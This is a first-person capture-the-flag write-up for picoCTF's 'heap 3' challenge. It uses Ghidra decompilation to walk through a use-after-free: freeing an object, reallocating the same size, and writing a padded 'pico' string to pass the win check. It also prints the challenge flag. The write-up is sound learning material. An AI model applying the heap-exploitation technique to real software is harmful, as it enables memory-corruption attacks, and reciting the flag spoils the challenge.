# heap 3 solution

first, i toss the binary into ghidra. the hint says to check out "use after free", so i do that.
```
void free_memory(void)

{
  free(x);
  return;
}
```

the free function deallocates a memory block (memblock) that was previously allocated by a call to calloc , malloc , or realloc. The number of freed bytes is equivalent to the number of bytes requested when the block was allocated (or reallocated, for realloc).

in this case, `x = (object *)malloc(0x23)`, `0x23` is 35 in decimal.  

```
int init(EVP_PKEY_CTX *ctx)

{
  int in_EAX;
  
  puts("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?");
  fflush(stdout);
  x = (object *)malloc(0x23);
  builtin_strncpy(x->flag,"bico",5);
  return in_EAX;
}
```
when i pick `3`, it is `x = bico`.
in this case, `5` must be picked first in order for me to start overwriting x from `bico` to `pico`.

```
void print_menu(void)

{
  printf(
        "\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. Exit\n\nEnter your choice: "
        );
  fflush(stdout);
  return;
}
```

i know that i need 35 characters to overwrite it, so after i choose option `5`, i will pick option `2`. this leads to the function below. 
```
// WARNING: Unknown calling convention -- yet parameter storage is locked

void alloc_object(void)

{
  void *pvVar1;
  int local_c;
  
  printf("Size of object allocation: ");
  fflush(stdout);
  local_c = 0;
  __isoc99_scanf(&DAT_004020d4,&local_c);
  pvVar1 = malloc((long)local_c);
  printf("Data for flag: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_004020e7,pvVar1);
  return;
}
```

i know that the space in x is enough for `35` characters. however, if i enter exactly `35` characters and i choose `3`, i will get `x = Apico`, which means i overflowed a bit too much. so i will have to input `34` characters instead. so i come up with `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico`, which is exactly `34` characters long.

so i choose option `2`, then i enter `35`, then i enter `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico`. nowwhen i choose `3`, i will get `x = pico`, which means i have successfully overwritted the variable. now when i choose option `4`, i will get the flag, which is: `picoCTF{now_thats_free_real_estate_a7381726}`!